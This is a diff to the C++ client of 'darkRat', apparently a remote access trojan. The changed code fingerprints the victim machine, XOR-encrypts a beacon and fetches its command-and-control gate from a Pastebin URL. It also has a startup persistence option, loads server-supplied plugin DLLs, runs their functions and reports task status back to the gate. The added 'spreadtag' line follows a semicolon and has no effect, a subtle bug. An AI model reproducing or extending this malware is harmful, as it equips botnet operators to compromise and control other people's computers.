@@ -36,7 +36,7 @@ public:
 
 
 
-	static std::string returnFinalPost() {
+	static std::string returnFinalPost(darkRat::config::config config) {
 		std::string net2 = Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v2.0.50727"));
 		std::string net3 = Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.0"));
 		std::string net35 = Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.5"));
@@ -63,6 +63,7 @@ public:
 			"&cpuName=" + cpuName +
 			"&arch=" + prcessorArchitecture +
 			"&operingsystem=" + winver;
+			"&spreadtag=" + config.spreadtag;
 		std::string finalPost = "request=" + XOR::encryptReqeust(args);
 		
 		return finalPost;
@@ -73,11 +74,11 @@ public:
 		std::thread startupPersistence;
 		std::thread runningPlugin;
 		//Fetch Gate from raw Site
-		std::string gateFromPatebin = XOR::encryptDecrypt(postRequest(config.pastebinUrl, "", "GET"));
-
+		std::string gateFromPatebin = XOR::Decrypt(postRequest(config.pastebinUrl, "", "GET"));
+		std::cout << gateFromPatebin;
 		//Main
 		std::string guid = Helpers::GetMachineGUID();
-		std::string finalPost = Client::returnFinalPost();
+		std::string finalPost = Client::returnFinalPost(config);
 
 		if (config.startup == OBFUSCATE("true")) {
 			try {
@@ -126,18 +127,16 @@ public:
 
 			
 					HINSTANCE hGetProcIDDLL = LoadLibrary(file.c_str());
-
 					if (hGetProcIDDLL) {
 						//started = "loaded";
 						if (v[3] != "") {
 							func fn = (func)GetProcAddress(hGetProcIDDLL, (LPCSTR)v[3].c_str());
 							runningPlugin = std::thread(fn, v[4]);
-							//d::cout << "funci() returned " << funci() << std::endl;
 						}
 						started = "success";
 					}
-					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST");
 
+					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST");
 				}
 				else {
 					if (responseFromGate.find(OBFUSCATE("uninstall")) != std::string::npos) {
